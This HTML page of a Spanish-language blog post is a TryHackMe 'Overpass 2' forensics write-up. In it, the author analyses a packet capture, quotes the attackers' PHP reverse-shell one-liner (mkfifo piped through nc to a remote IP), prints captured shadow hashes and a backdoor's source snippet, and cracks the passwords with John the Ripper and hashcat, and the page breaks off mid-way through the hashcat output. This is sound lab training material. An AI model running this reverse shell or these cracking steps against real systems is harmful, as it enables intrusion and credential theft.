@@ -1,0 +1,702 @@
+<!DOCTYPE html>
+<html class="" lang="en"><head>
+    
+    <meta name="viewport" content="width=device-width" />
+    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=7" />
+
+    <link
+    rel="icon"
+    href='/favicon.png'
+/>
+<link
+    rel="shortcut icon"
+    href='/favicon.ico'
+    type="image/x-icon"
+/>
+<link
+    rel="apple-touch-icon"
+    href='/apple-touch-icon.png'
+/>
+
+    <link
+        rel="icon"
+        href='/logo.svg'
+        type="image/svg+xml"
+    />
+
+<title>
+        
+            Overpass 2 - Hacked [TryHackMe]  &ndash;
+        
+        K3ssDev
+:/var/log$  
+    </title>
+    <link href="/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" />
+    <link href="/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" />
+    
+    
+    <link type="text/css" rel="stylesheet" href=https://k3ssdev.github.io/css/styles.c5c0ca1ad04162d8cbbaa1291d7d0e5d96b9ad04a6b2b68c8ed577d7eabb970ab79d33477f3b13c760eed232f5f642bdcbce1f28bf3f057c36edf5e6c41d203c.css integrity="sha512-xcDKGtBBYtjLuqEpHX0OXZa5rQSmsraMjtV31&#43;q7lwq3nTNHfzsTx2Du0jL19kK9y84fKL8/BXw27fXmxB0gPA==" />
+<meta name="author" content="Alberto Pérez" />
+
+    
+        <meta name="keywords" content='forensics, GTOFbins, hashcat, johntheripper, Linux, medium, network, pcapng, ssh-backdoor, SUID, TryHackMe, wireshark' />
+    
+    
+        <meta name="description" content="s dos es una sala distinta a las anteriores, esta vez no se trata de atacar un objetivo, si no de analizar un ataque y recuperar el control de una máquina que ha sido vulnerada. La primera parte consiste en analizar el tráfico de red capturado en un fichero pcapng con Wireshark, y una vez se haya descubierto el método usado por los atacantes, entrar en el equipo y conseguir las banderas." />
+    
+
+<meta property="og:site_name"
+    content='K3ssDev
+:/var/log$  ' />
+
+    <meta property="og:title" content="Overpass 2 - Hacked [TryHackMe]" />
+    <meta property="og:type" content="article" />
+    
+    <meta
+        property="article:author" content="Alberto Pérez" />
+    <meta
+        property="article:published_time"
+        content='2023-09-04T00:03:00Z&#43;0200' />
+    
+        
+            <meta property="article:tag" content="forensics" />
+        
+            <meta property="article:tag" content="GTOFbins" />
+        
+            <meta property="article:tag" content="hashcat" />
+        
+            <meta property="article:tag" content="johntheripper" />
+        
+            <meta property="article:tag" content="Linux" />
+        
+            <meta property="article:tag" content="medium" />
+        
+            <meta property="article:tag" content="network" />
+        
+            <meta property="article:tag" content="pcapng" />
+        
+            <meta property="article:tag" content="ssh-backdoor" />
+        
+            <meta property="article:tag" content="SUID" />
+        
+            <meta property="article:tag" content="TryHackMe" />
+        
+            <meta property="article:tag" content="wireshark" />
+        
+    
+    <meta property="og:url" content="https://k3ssdev.github.io/posts/overpass2/" />
+    <meta property="og:image"
+        content='https://k3ssdev.github.io/images/post_pics/overpass2/overpass2.png
+        ' />
+    
+        <meta property="og:description" content="Introducción Overpass dos es una sala distinta a las anteriores, esta vez no se trata de atacar un objetivo, si no de analizar un ataque y recuperar el control " />
+    
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:domain"
+      content='k3ssdev.github.io'
+/>
+<meta property="twitter:url" content="https://k3ssdev.github.io/posts/overpass2/" />
+
+
+    <meta name="twitter:title" content="Overpass 2 - Hacked [TryHackMe]" />
+    
+    <meta name="twitter:image"
+        content='https://k3ssdev.github.io/images/post_pics/overpass2/overpass2.png
+        ' />
+    
+        <meta name="twitter:description" content="Introducción Overpass dos es una sala distinta a las anteriores, esta vez no se trata de atacar un objetivo, si no de analizar un ataque y recuperar el control " />
+    
+
+<link rel="manifest" href="/manifest/index.json" />
+</head>
+
+
+<body>
+        <div id="baseContainer"><header class="">
+<div class="titleAndSearchContainer">
+        <div id="titleContainer">
+            
+                <a class="unstyledLink" href="/">
+                    <img src='/logo.svg' />
+                </a>
+            
+            <div class="rightOfLogo">
+                <div class="titleAndHamburger">
+                    <h1>
+                        <a class="unstyledLink" href="/">K3ssDev
+:/var/log$  </a>
+                        
+                    </h1>
+                    
+                        <label id="hamburger-menu" for="main-nav-toggler">
+                            &#xf85b;
+                        </label>
+                    
+                </div>
+                <div id="wide_nav"><nav>
+    
+        <input type="checkbox" id="main-nav-toggler" />
+    
+    <ul id="main-nav">
+        <li><a href="/">Home</a></li>
+        
+            <li><a href="/posts">Posts</a></li>
+        
+        
+        
+        
+        
+            <li><a href="https://k3ssdev.github.io/pages/about/">
+                About
+            </a></li>
+        
+        
+        
+            <li><a href="/tags">Tags</a></li>
+        
+        
+            <li><a href="/search">Search</a></li>
+        
+    </ul>
+</nav>
+</div>
+            </div>
+        </div>
+        <div class="search">
+    <input id="searchbar" type="text" placeholder='Search' />
+    <a class="nerdlink" onclick="newSearch();">&#xf002;</a>
+</div>
+<script>
+    function newSearch() {
+        let term = searchbar.value.trim();
+        if (!term) return;
+        location.href = `/search?q=${term}`;
+    }
+    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
+</script>
+
+    </div>
+    <div id="links">
+        
+        
+        <a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="mailto:k3ssdev@proton.me">
+    
+    
+        &#xf6ed;
+    
+    <span>
+        Email
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://www.linkedin.com/in/alberto-perez-del-rio/">
+    
+    
+        &#xf0e1;
+    
+    <span>
+        Linkedin
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://github.com/k3ssdev">
+    
+    
+        &#xf09b;
+    
+    <span>
+        Github
+    </span>
+</a>
+
+    </div>
+    
+        <div id="sidebar_nav"><nav>
+    
+        <input type="checkbox" id="main-nav-toggler" />
+    
+    <ul id="main-nav">
+        <li><a href="/">Home</a></li>
+        
+            <li><a href="/posts">Posts</a></li>
+        
+        
+        
+        
+        
+            <li><a href="https://k3ssdev.github.io/pages/about/">
+                About
+            </a></li>
+        
+        
+        
+            <li><a href="/tags">Tags</a></li>
+        
+        
+            <li><a href="/search">Search</a></li>
+        
+    </ul>
+</nav>
+</div>
+        
+    
+<script src="https://tryhackme.com/badge/1277295"></script>
+
+
+</header>
+<div id="contentContainer">
+                <div id="content">
+                    <main>
+<article class="card single">
+    
+        <h1>Overpass 2 - Hacked [TryHackMe]</h1>
+    
+    
+        <p class="date">
+            <span title='Date'> </span>
+    2023-09-04
+
+</p>
+    
+    
+    
+        <figure style="margin: 0">
+            <img src="/images/post_pics/overpass2/overpass2.png" alt="" />
+            
+        </figure>
+    
+    
+    <div><h2 id="introducción">Introducción</h2>
+<p>Overpass dos es una sala distinta a las anteriores, esta vez no se trata de atacar un objetivo, si no de analizar un ataque y recuperar el control de una máquina que ha sido vulnerada. La primera parte consiste en analizar el tráfico de red capturado en un fichero pcapng con Wireshark, y una vez se haya descubierto el método usado por los atacantes, entrar en el equipo y conseguir las banderas.</p>
+<h2 id="task-1---forensics---analyse-the-pcap">Task 1 - Forensics - Analyse the PCAP</h2>
+<h3 id="paso-1">Paso 1</h3>
+<ul>
+<li>Descargo el fichero pcapng y lo analizo con Wireshark.</li>
+<li>Revisando los primeros paquetes, encuentro que los atacantes aprovechan la URL /development para subir una reverse shell.</li>
+<li>El payload utilizado ha sido:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&lt;?php exec<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.170.145 4242 &gt;/tmp/f&#34;</span><span style="color:#f92672">)</span>?&gt;
+</span></span></code></pre></div><h3 id="paso-2">Paso 2</h3>
+<ul>
+<li>Los atacantes acceden a /etc/shadow y a /etc/passwd para obtener usuarios y hashes del sistema.</li>
+<li>La contraseña usada para obtener acceso privilegiado ha sido whenevernoteartinstant</li>
+<li>Encuentro que acceden a <a href="https://github.com/NinjaJc01/ssh-backdoor">https://github.com/NinjaJc01/ssh-backdoor</a> y clonan el repositorio para generar un payload de persistencia en el sistema.</li>
+</ul>
+<h3 id="paso-3">Paso 3</h3>
+<ul>
+<li>En el tráfico capturado, se puede ver el contenido de /etc/passwd</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ cat shadow.txt
+</span></span><span style="display:flex;"><span>───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>       │ File: shadow.txt
+</span></span><span style="display:flex;"><span>───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1</span>   │ root:*:18295:0:99999:7:::
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">2</span>   │ daemon:*:18295:0:99999:7:::
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">3</span>   │ bin:*:18295:0:99999:7:::
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">4</span>   │ sys:*:18295:0:99999:7:::
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">5</span>   │ sync:*:18295:0:99999:7:::
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">6</span>   │ games:*:18295:0:99999:7:::
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">7</span>   │ man:*:18295:0:99999:7:::
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">8</span>   │ lp:*:18295:0:99999:7:::
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">9</span>   │ mail:*:18295:0:99999:7:::
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">10</span>   │ news:*:18295:0:99999:7:::
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">11</span>   │ uucp:*:18295:0:99999:7:::
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">12</span>   │ proxy:*:18295:0:99999:7:::
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">13</span>   │ www-data:*:18295:0:99999:7:::
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">14</span>   │ backup:*:18295:0:99999:7:::
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">15</span>   │ list:*:18295:0:99999:7:::
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">16</span>   │ irc:*:18295:0:99999:7:::
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">17</span>   │ gnats:*:18295:0:99999:7:::
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">18</span>   │ nobody:*:18295:0:99999:7:::
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">19</span>   │ systemd-network:*:18295:0:99999:7:::
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">20</span>   │ systemd-resolve:*:18295:0:99999:7:::
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">21</span>   │ syslog:*:18295:0:99999:7:::
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">22</span>   │ messagebus:*:18295:0:99999:7:::
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">23</span>   │ _apt:*:18295:0:99999:7:::
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">24</span>   │ lxd:*:18295:0:99999:7:::
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">25</span>   │ uuidd:*:18295:0:99999:7:::
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">26</span>   │ dnsmasq:*:18295:0:99999:7:::
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">27</span>   │ landscape:*:18295:0:99999:7:::
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">28</span>   │ pollinate:*:18295:0:99999:7:::
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">29</span>   │ sshd:*:18464:0:99999:7:::
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">30</span>   │ james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">31</span>   │ paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">32</span>   │ szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">33</span>   │ bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">34</span>   │ muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::
+</span></span></code></pre></div><ul>
+<li>Compruebo con John The Ripper que hay 4 contraseñas vulnerables.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ john hashes.txt --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/fasttrack.txt
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">5</span> password hashes with <span style="color:#ae81ff">5</span> different salts <span style="color:#f92672">(</span>sha512crypt, crypt<span style="color:#f92672">(</span>3<span style="color:#f92672">)</span> $6$ <span style="color:#f92672">[</span>SHA512 256/256 AVX2 4x<span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>Remaining <span style="color:#ae81ff">1</span> password hash
+</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>iteration count<span style="color:#f92672">)</span> is <span style="color:#ae81ff">5000</span> <span style="color:#66d9ef">for</span> all loaded hashes
+</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">24</span> OpenMP threads
+</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+</span></span><span style="display:flex;"><span>0g 0:00:00:00 DONE <span style="color:#f92672">(</span>2023-09-04 00:03<span style="color:#f92672">)</span> 0g/s 7400p/s 7400c/s 7400C/s Spring2017..starwars
+</span></span><span style="display:flex;"><span>Session completed. 
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                         
+</span></span><span style="display:flex;"><span>❯ john hashes.txt --show
+</span></span><span style="display:flex;"><span>paradox:secuirty3:18464:0:99999:7:::
+</span></span><span style="display:flex;"><span>szymex:abcd123:18464:0:99999:7:::
+</span></span><span style="display:flex;"><span>bee:secret12:18464:0:99999:7:::
+</span></span><span style="display:flex;"><span>muirland:1qaz2wsx:18464:0:99999:7:::
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span> password hashes cracked, <span style="color:#ae81ff">1</span> left
+</span></span></code></pre></div><h1 id="task-2---research---analyse-the-code">Task 2 - Research - Analyse the code</h1>
+<h3 id="paso-4">Paso 4</h3>
+<ul>
+<li>El codigo del payload contiene el hash que se utilizar;a para el backdoor, al que después le añade el salt en una función en el mismo código. Fichero main.go del repositorio <a href="https://github.com/NinjaJc01/ssh-backdoor">https://github.com/NinjaJc01/ssh-backdoor</a></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>package main
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>import <span style="color:#f92672">(</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;crypto/sha512&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;fmt&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;io&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;io/ioutil&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;log&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;net&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;os/exec&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;github.com/creack/pty&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;github.com/gliderlabs/ssh&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;github.com/integrii/flaggy&#34;</span>
+</span></span><span style="display:flex;"><span>	gossh <span style="color:#e6db74">&#34;golang.org/x/crypto/ssh&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;golang.org/x/crypto/ssh/terminal&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>var hash string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3&#34;</span>
+</span></span></code></pre></div><ul>
+<li>El salt viene en esta parte del codigo:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>func passwordHandler<span style="color:#f92672">(</span>_ ssh.Context, password string<span style="color:#f92672">)</span> bool <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> verifyPass<span style="color:#f92672">(</span>hash, <span style="color:#e6db74">&#34;1c362db832f3f864c8c2fe05f2002a05&#34;</span>, password<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><ul>
+<li>En los paquetes capturados, encuentro el hash usado por el atacante.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
+</span></span></code></pre></div><h3 id="paso-5">Paso 5</h3>
+<ul>
+<li>Junto el hash y el salt en un fichero y los paso por John the Ripper para crackearlo. No parece conseguir crackearlo, asi que cambio a hashcat.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>       │ File: overpass
+</span></span><span style="display:flex;"><span>───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1</span>   │ ❯ hashcat -m <span style="color:#ae81ff">1710</span> password.txt -a <span style="color:#ae81ff">0</span> /usr/share/wordlists/rockyou.txt -o output.txt
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">2</span>   │ hashcat <span style="color:#f92672">(</span>v6.2.6<span style="color:#f92672">)</span> starting
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">3</span>   │ 
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">4</span>   │ * Device <span style="color:#75715e">#1: WARNING! Kernel exec timeout is not disabled.</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">5</span>   │              This may cause <span style="color:#e6db74">&#34;CL_OUT_OF_RESOURCES&#34;</span> or related errors.
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">6</span>   │              To disable the timeout, see: https://hashcat.net/q/timeoutpatch
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">7</span>   │ * Device <span style="color:#75715e">#2: WARNING! Kernel exec timeout is not disabled.</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">8</span>   │              This may cause <span style="color:#e6db74">&#34;CL_OUT_OF_RESOURCES&#34;</span> or related errors.
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">9</span>   │              To disable the timeout, see: https://hashcat.net/q/timeoutpatch
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">10</span>   │ CUDA API <span style="color:#f92672">(</span>CUDA 12.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">11</span>   │ <span style="color:#f92672">====================</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">12</span>   │ * Device <span style="color:#75715e">#1: NVIDIA GeForce RTX 4080, 15337/16077 MB, 76MCU</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">13</span>   │ 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">14</span>   │ OpenCL API <span style="color:#f92672">(</span>OpenCL 3.0 CUDA 12.0.151<span style="color:#f92672">)</span> - Platform <span style="color:#75715e">#1 [NVIDIA Corporation]</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">15</span>   │ <span style="color:#f92672">========================================================================</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">16</span>   │ * Device <span style="color:#75715e">#2: NVIDIA GeForce RTX 4080, skipped</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">17</span>   │ 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">18</span>   │ OpenCL API <span style="color:#f92672">(</span>OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG<span style="color:#f92672">)</span> - Platform <span style="color:#75715e">#2 [The pocl project]</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">19</span>   │ <span style="color:#f92672">==================================================================================================================================================</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">20</span>   │ * Device <span style="color:#75715e">#3: cpu-haswell-13th Gen Intel(R) Core(TM) i7-13700KF, skipped</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">21</span>   │ 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">22</span>   │ Minimum password length supported by kernel: <span style="color:#ae81ff">0</span>                                                                                                                                                                                      
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">23</span>   │ Maximum password length supported by kernel: <span style="color:#ae81ff">256</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">24</span>   │ Minimim salt length supported by kernel: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">25</span>   │ Maximum salt length supported by kernel: <span style="color:#ae81ff">256</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">26</span>   │ 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">27</span>   │ Hashes: <span style="color:#ae81ff">1</span> digests; <span style="color:#ae81ff">1</span> unique digests, <span style="color:#ae81ff">1</span> unique salts
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">28</span>   │ Bitmaps: <span style="color:#ae81ff">16</span> bits, <span style="color:#ae81ff">65536</span> entries, 0x0000ffff mask, <span style="color:#ae81ff">262144</span> bytes, 5/13 rotates
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">29</span>   │ Rules: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">30</span>   │ 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">31</span>   │ Optimizers applied:
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">32</span>   │ * Zero-Byte
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">33</span>   │ * Early-Skip
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">34</span>   │ * Not-Iterated
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">35</span>   │ * Single-Hash
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">36</span>   │ * Single-Salt
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">37</span>   │ * Raw-Hash
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">38</span>   │ * Uses-64-Bit
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">39</span>   │ 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">40</span>   │ ATTENTION! Pure <span style="color:#f92672">(</span>unoptimized<span style="color:#f92672">)</span> backend kernels selected.
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">41</span>   │ Pure kernels can crack longer passwords, but drastically reduce performance.
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">42</span>   │ If you want to switch to optimized kernels, append -O to your commandline.
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">43</span>   │ See the above message to find out about the exact limits.
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">44</span>   │ 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">45</span>   │ Watchdog: Temperature abort trigger set to 90c
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">46</span>   │ 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">47</span>   │ Host memory required <span style="color:#66d9ef">for</span> this attack: <span style="color:#ae81ff">1334</span> MB
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">48</span>   │ 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">49</span>   │ Dictionary cache built:
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">50</span>   │ * Filename..: /usr/share/wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">51</span>   │ * Passwords.: <span style="color:#ae81ff">14344392</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">52</span>   │ * Bytes.....: <span style="color:#ae81ff">139921507</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">53</span>   │ * Keyspace..: <span style="color:#ae81ff">14344385</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">54</span>   │ * Runtime...: <span style="color:#ae81ff">0</span> secs
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">55</span>   │ 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">56</span>   │                                                           
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">57</span>   │ Session..........: hashcat
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">58</span>   │ Status...........: Cracked
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">59</span>   │ Hash.Mode........: <span style="color:#ae81ff">1710</span> <span style="color:#f92672">(</span>sha512<span style="color:#f92672">(</span>$pass.$salt<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">60</span>   │ Hash.Target......: 6d05358f090eea56a238af02e47d44ee5489d234810ef624028...002a05
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">61</span>   │ Time.Started.....: Sun Sep  <span style="color:#ae81ff">3</span> 18:38:09 <span style="color:#ae81ff">2023</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span> secs<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">62</span>   │ Time.Estimated...: Sun Sep  <span style="color:#ae81ff">3</span> 18:38:09 <span style="color:#ae81ff">2023</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span> secs<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">63</span>   │ Kernel.Feature...: Pure Kernel
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">64</span>   │ Guess.Base.......: File <span style="color:#f92672">(</span>/usr/share/wordlists/rockyou.txt<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">65</span>   │ Guess.Queue......: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">66</span>   │ Speed.#1.........:   206.9 MH/s <span style="color:#f92672">(</span>5.20ms<span style="color:#f92672">)</span> @ Accel:1024 Loops:1 Thr:64 Vec:1
